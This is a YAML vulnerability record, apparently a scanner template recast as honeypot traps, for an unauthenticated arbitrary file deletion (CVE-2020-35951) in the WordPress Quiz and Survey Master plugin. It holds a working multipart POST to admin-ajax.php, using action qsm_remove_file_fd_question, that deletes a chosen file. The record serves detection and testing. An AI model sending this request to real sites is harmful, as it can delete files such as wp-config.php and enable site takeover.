id: CVE-2020-35951
info:
  name: Wordpress Quiz and Survey Master <7.0.1 - Arbitrary File Deletion
  author: princechaddha
  description: Wordpress Quiz and Survey Master <7.0.1 allows users to delete arbitrary
    files such as wp-config.php file, which could effectively take a site offline
    and allow an attacker to reinstall with a WordPress instance under their control.
    This occurred via qsm_remove_file_fd_question, which allowed unauthenticated deletions
    (even though it was only intended for a person to delete their own quiz-answer
    files).
  severity: critical
  impact: 'This vulnerability can lead to unauthorized deletion of critical files,
    resulting in data loss or server compromise.

    '
  remediation: 'Upgrade to the latest version of Wordpress Quiz and Survey Master
    plugin (7.0.1 or higher) to mitigate this vulnerability.

    '
  reference:
  - https://www.wordfence.com/blog/2020/08/critical-vulnerabilities-patched-in-quiz-and-survey-master-plugin/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35951
  - https://wpscan.com/vulnerability/10348
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H
    cvss-score: 9.9
    cve-id: CVE-2020-35951
    cwe-id: CWE-306
    epss-score: 0.00174
    epss-percentile: 0.54591
    cpe: cpe:2.3:a:expresstech:quiz_and_survey_master:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 4
    vendor: expresstech
    product: quiz_and_survey_master
    framework: wordpress
  tags: cve,cve2020,wordpress,wp-plugin,wpscan,intrusive,expresstech
traps:
- request:
    method: GET
    path: /wp-content/plugins/quiz-master-next/README.md
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: '{"type":"success","message":"File removed successfully"}'
- request:
    method: GET
    path: /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92
    body: |2

      ------WebKitFormBoundaryBJ17hSJBjuGrnW92
      Content-Disposition: form-data; name="action"

      qsm_remove_file_fd_question
      ------WebKitFormBoundaryBJ17hSJBjuGrnW92
      Content-Disposition: form-data; name="file_url"

      {{fullpath}}wp-content/plugins/quiz-master-next/README.md
      ------WebKitFormBoundaryBJ17hSJBjuGrnW92--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-content/plugins/quiz-master-next/README.md
    headers: {}
    body: ''
  response:
    status_code: 301
    headers: {}
    body: ''
